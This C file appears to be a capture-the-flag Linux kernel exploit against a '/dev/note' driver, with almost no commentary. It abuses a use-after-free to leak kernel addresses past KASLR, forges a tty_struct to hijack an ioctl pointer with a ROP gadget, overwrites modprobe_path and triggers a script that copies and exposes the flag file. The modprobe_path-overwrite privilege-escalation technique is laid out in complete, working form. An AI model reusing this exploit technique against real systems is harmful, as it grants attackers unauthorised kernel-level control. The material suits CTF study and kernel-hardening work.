#define _GNU_SOURCE

#include <fcntl.h> // O_RDWR
#include <sched.h> // cpu_set_t
#include <stdint.h> // uint32_t
#include <stdio.h> // perror
#include <string.h> // memset
#include <sys/ioctl.h> // ioctl
#include <unistd.h> // getpid
#include <sys/timerfd.h>
#include <stdlib.h> // system

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define SUCCESS(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define CMD_ALLOCATE 0x1001
#define CMD_VIEW 0x1002
#define CMD_EDIT 0x1003
#define CMD_DELETE 0x1004

#define timerfd_tmrproc_offset 0x545810
#define modprobe_path 0x1dd3b20
#define rop 0x4c08c0 // xchg dword ptr [rdx + 0x4c], esi ; ret

struct note_data {
    uint64_t size;
    uint64_t index;
    char* buffer;
};

uint32_t fd;
char mem_1[256];
char mem_2[256];

void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

int ioctl_note_allocate(uint64_t size)
{
    return ioctl(fd, CMD_ALLOCATE, size);
}

int ioctl_note_view(uint64_t index, char* buffer)
{
    struct note_data req = { .index = index, .buffer = buffer };

    return ioctl(fd, CMD_VIEW, &req);
}

int ioctl_note_edit(uint64_t index, char* buffer)
{
    struct note_data req = { .index = index, .buffer = buffer };

    return ioctl(fd, CMD_EDIT, &req);
}

int ioctl_note_delete(uint64_t index)
{
    return ioctl(fd, CMD_DELETE, index);
}

int main()
{
    // Set CPU affinity to make sure heap allocations won't spread over different CPUs
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) == -1) {
        perror("sched_setaffinity");
        return -1;
    }

    fd = open("/dev/note", O_RDWR);
    if (fd == -1) {
        ERROR("/dev/note");
        return -1;
    }

    // ====== BYPASS KASLR ======
    ioctl_note_allocate(256);
    ioctl_note_delete(0);

    // allocate timerfd_ctx
    int tfd = timerfd_create(CLOCK_REALTIME, 0);
    // make timerfd_ctx->tmr->function = &timerfd_tmrproc
    struct itimerspec ts;
    ts.it_interval.tv_sec = 0;
    ts.it_interval.tv_nsec = 0;
    ts.it_value.tv_sec = 10000 / 1000;
    ts.it_value.tv_nsec = (10000 % 1000) * 1000000;
    timerfd_settime(tfd, 0, &ts, NULL);

    ioctl_note_view(0, mem_1);

    // DumpHex(buffer, 256);
    uint64_t vmlinux = *(uint64_t *)&mem_1[0x28] - timerfd_tmrproc_offset;
    uint64_t kheap_buffer0 = *(uint64_t *)&mem_1[0x90] - 0x90;
    SUCCESS("kaslr: 0x%lx", vmlinux);
    SUCCESS("kheap: 0x%lx", kheap_buffer0);

    close(tfd);

    // ====== overwrite modprobe_path ======
    ioctl_note_allocate(0x20);
    ioctl_note_delete(1);

    // tty_file_private: kmalloc-32 (GFP_KERNEL) is used = gbuffers[1]->buffer
    int pfd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);

    ioctl_note_view(1, mem_2);
    // DumpHex(buffer, 0x20);
    uint64_t orig_tty = *(uint64_t *)&mem_2[0x0];

    // edit buffer1 = overwrite tty_file_private
    // tty_file_private->tty = buffer0
    *(uint64_t *)&mem_2[0x0] = kheap_buffer0; 
    ioctl_note_edit(1, mem_2);

    // edit buffer0 = overwrite tty_struct
    memset(mem_1, 0, 256);
    *(uint64_t *)&mem_1[0x10] = kheap_buffer0; // struct tty_driver *driver; // must be valid
    *(uint64_t *)&mem_1[0x20] = kheap_buffer0; // struct tty_operations *ops;
    *(uint64_t *)&mem_1[0x60] = vmlinux + rop; // tty_operations->ioctl
    ioctl_note_edit(0, mem_1);

    // overwrite modprobe_path
    char path[] = "/home/ctf/x";
    ioctl(pfd, *(uint32_t*)path, vmlinux + modprobe_path - 0x4c);
    ioctl(pfd, *(uint32_t*)&path[4], vmlinux + modprobe_path - 0x4c + 4);
    ioctl(pfd, *(uint32_t*)&path[8], vmlinux + modprobe_path - 0x4c + 8);

    // restore tty_file_private
    *(uint64_t *)&mem_2[0x0] = orig_tty;
    ioctl_note_edit(1, mem_2);

    system("echo -ne \"\xff\xff\xff\xff\" > /home/ctf/y");
    system("echo -ne \"#!/bin/sh\ncp /flag /home/ctf/flag; chmod 777 /home/ctf/flag\" > /home/ctf/x");
    system("chmod +x /home/ctf/x /home/ctf/y");
    system("/home/ctf/y");
    system("cat /home/ctf/flag");
}